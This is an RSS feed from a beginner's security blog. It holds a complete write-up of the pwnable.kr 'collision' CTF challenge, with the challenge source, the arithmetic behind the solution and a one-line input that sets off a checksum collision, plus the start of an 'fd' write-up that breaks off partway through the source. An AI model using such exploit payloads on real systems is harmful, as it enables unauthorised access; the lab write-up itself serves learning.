<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Root Network Security</title>
    <description>Beginners's journey through the world of security, programming and system administration. In love with GNU/Linux and cryptography.</description>
    <link>http://localhost:4000/</link>
    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
    
      <item>
        <title>Pwnable.kr - collision</title>
        <description>&lt;p&gt;Let’s start another challenge from &lt;a href=&quot;http://pwnable.kr&quot; title=&quot;pwnable.kr&quot;&gt;pwnable.kr&lt;/a&gt; called &lt;strong&gt;&lt;em&gt;collision&lt;/em&gt;&lt;/strong&gt;, which is next one in &lt;strong&gt;&lt;em&gt;Toddler’s Bottle&lt;/em&gt;&lt;/strong&gt; category.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Daddy told me about cool MD5 hash collision today.
I wanna do something like that too!&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Once again we have to connect via &lt;strong&gt;&lt;em&gt;ssh&lt;/em&gt;&lt;/strong&gt; in order to view challenge files.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;w3ndige@main ~ % ssh col@pwnable.kr &lt;span class=&quot;nt&quot;&gt;-p2222&lt;/span&gt;
col@pwnable.krs password:
 ____  __    __  ____    ____  ____   _        ___      __  _  ____  
|    &lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;  |__|  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;    &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt; /    &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;    &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;| |      /  _]    |  |/ &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;|    &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
|  o  &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  |  |  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  _  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  o  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  o  &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;| |     /  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;_     |  &lt;span class=&quot;s1&quot;&gt;' / |  D  )
|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    /
|  |  |  `  '&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  |  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  _  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  O  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;_  __ |     &lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;    &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
|  |   &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;     / |  |  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  |  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
|__|    &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;/&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;/  |__|__||__|__||_____||_____||_____||__||__|&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;__|&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;|

- Site admin : daehee87.kr@gmail.com
- IRC : irc.netgarage.org:6667 / &lt;span class=&quot;c&quot;&gt;#pwnable.kr&lt;/span&gt;
- Simply &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;irssi&quot;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;to join IRC now
- files under /tmp can be erased anytime. make your directory under /tmp
- to use peda, issue &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;source&lt;/span&gt; /usr/share/peda/peda.py&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;gdb terminal
Last login: Fri Nov 24 12:21:39 2017 from 24.16.85.95
col@ubuntu:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 36
drwxr-x---  5 root    col     4096 Oct 23  2016 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 80 root    root    4096 Jan 11  2017 ..
d---------  2 root    root    4096 Jun 12  2014 .bash_history
&lt;span class=&quot;nt&quot;&gt;-r-sr-x---&lt;/span&gt;  1 col_pwn col     7341 Jun 11  2014 col
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root    root     555 Jun 12  2014 col.c
&lt;span class=&quot;nt&quot;&gt;-r--r-----&lt;/span&gt;  1 col_pwn col_pwn   52 Jun 11  2014 flag
dr-xr-xr-x  2 root    root    4096 Aug 20  2014 .irssi
drwxr-xr-x  2 root    root    4096 Oct 23  2016 .pwntools-cache&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And without hesitation, let’s jump straight into the code.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hashcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x21DD09EC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;check_password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]){&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;usage : %s [passcode]&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;passcode length should be 20 bytes&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hashcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;check_password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)){&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/cat flag&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;wrong passcode.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Firstly &lt;code class=&quot;highlighter-rouge&quot;&gt;int* ip = (int*)p;&lt;/code&gt; will cast the char, passed as the parameter into the &lt;code class=&quot;highlighter-rouge&quot;&gt;check_password&lt;/code&gt; function. In addition we know that the passcode has to be &lt;strong&gt;&lt;em&gt;20 bytes&lt;/em&gt;&lt;/strong&gt;. After doing simple mathematics, our input will have to consist of 5 integers, as the size of &lt;code class=&quot;highlighter-rouge&quot;&gt;int&lt;/code&gt; is &lt;strong&gt;&lt;em&gt;4 bytes&lt;/em&gt;&lt;/strong&gt;.  What next?&lt;/p&gt;

&lt;p&gt;Function will return the sum of these 5 integers, which is calculated by the loop. Back in the &lt;code class=&quot;highlighter-rouge&quot;&gt;main&lt;/code&gt; function, this sum is checked for length, then compared with &lt;strong&gt;&lt;em&gt;hash&lt;/em&gt;&lt;/strong&gt; and if the answer is correct, it will view the flag for us.&lt;/p&gt;

&lt;p&gt;Let’s convert &lt;strong&gt;&lt;em&gt;hash&lt;/em&gt;&lt;/strong&gt; into the decimal number.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x21DD09EC&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;568134124&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Great, now we can divide it into &lt;strong&gt;&lt;em&gt;5 pieces&lt;/em&gt;&lt;/strong&gt;. But as the number is not divisible by 5, we’ll have to use floor division which will truncate numbers after decimal point.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x21DD09EC&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;//&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;113626824&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;113626824&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;'0x6c5cec8'&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now let’s use these 4 &lt;em&gt;pieces&lt;/em&gt;. We will substract them from the original hash, which will result in our fifth piece.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x21DD09EC&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;454507296&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;113626828&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;113626828&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;'0x6c5cecc'&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Will it be true? We can check it with simple comparision operation.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x6c5cec8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x6c5cecc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x21DD09EC&lt;/span&gt;
&lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Great, our math worked out! Now we will only have to convert these hex values into &lt;strong&gt;&lt;em&gt;little endian&lt;/em&gt;&lt;/strong&gt;, as that’s how C stores integers. After that we’re ready to exploit this application.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;col@ubuntu:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./col &lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;python2 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'print &quot;\xc8\xce\xc5\x06&quot; * 4 + &quot;\xcc\xce\xc5\x06&quot;;'&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;
daddy! I just managed to create a &lt;span class=&quot;nb&quot;&gt;hash &lt;/span&gt;collision :&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

</description>
        <pubDate>Fri, 24 Nov 2017 08:00:00 +0000</pubDate>
        <link>http://localhost:4000/pwnable.kr-collision/</link>
        <guid isPermaLink="true">http://localhost:4000/pwnable.kr-collision/</guid>
      </item>
    
      <item>
        <title>Pwnable.kr - fd</title>
        <description>&lt;p&gt;After feeling a big need to improve my knowledge of &lt;em&gt;pwnable&lt;/em&gt; category, I decided  to check out &lt;a href=&quot;http://pwnable.kr&quot; title=&quot;pwnable.kr&quot;&gt;pwnable.kr&lt;/a&gt; and start from the beginning.&lt;/p&gt;

&lt;p&gt;Here comes the &lt;strong&gt;&lt;em&gt;Toddler’s Bottle&lt;/em&gt;&lt;/strong&gt; and the first challenge - &lt;strong&gt;&lt;em&gt;fd&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Mommy! what is a file descriptor in Linux?&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;In order to view the challenge, we have to connect via &lt;strong&gt;&lt;em&gt;ssh&lt;/em&gt;&lt;/strong&gt; with password &lt;strong&gt;&lt;em&gt;guest&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;w3ndige@main ~ % ssh fd@pwnable.kr &lt;span class=&quot;nt&quot;&gt;-p2222&lt;/span&gt;
fd@pwnable.krs password:
 ____  __    __  ____    ____  ____   _        ___      __  _  ____  
|    &lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;  |__|  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;    &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt; /    &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;    &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;| |      /  _]    |  |/ &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;|    &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
|  o  &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  |  |  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  _  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  o  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  o  &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;| |     /  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;_     |  &lt;span class=&quot;s1&quot;&gt;' / |  D  )
|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    /
|  |  |  `  '&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  |  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  _  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  O  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;_  __ |     &lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;    &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
|  |   &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;     / |  |  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  |  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
|__|    &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;/&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;/  |__|__||__|__||_____||_____||_____||__||__|&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;__|&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;|

- Site admin : daehee87.kr@gmail.com
- IRC : irc.netgarage.org:6667 / &lt;span class=&quot;c&quot;&gt;#pwnable.kr&lt;/span&gt;
- Simply &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;irssi&quot;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;to join IRC now
- files under /tmp can be erased anytime. make your directory under /tmp
- to use peda, issue &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;source&lt;/span&gt; /usr/share/peda/peda.py&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;gdb terminal
Last login: Thu Nov 23 11:25:25 2017 from 131.202.114.32
fd@ubuntu:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 40
drwxr-x---  5 root   fd   4096 Oct 26  2016 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 80 root   root 4096 Jan 11  2017 ..
d---------  2 root   root 4096 Jun 12  2014 .bash_history
&lt;span class=&quot;nt&quot;&gt;-r-sr-x---&lt;/span&gt;  1 fd_pwn fd   7322 Jun 11  2014 fd
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root   root  418 Jun 11  2014 fd.c
&lt;span class=&quot;nt&quot;&gt;-r--r-----&lt;/span&gt;  1 fd_pwn root   50 Jun 11  2014 flag
&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;  1 root   root  128 Oct 26  2016 .gdb_history
dr-xr-xr-x  2 root   root 4096 Dec 19  2016 .irssi
drwxr-xr-x  2 root   root 4096 Oct 23  2016 .pwntools-cache&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;In this directory we have the challenge files - source code and binary. Firstly, let’s view the source to understand what’s going on.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]){&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
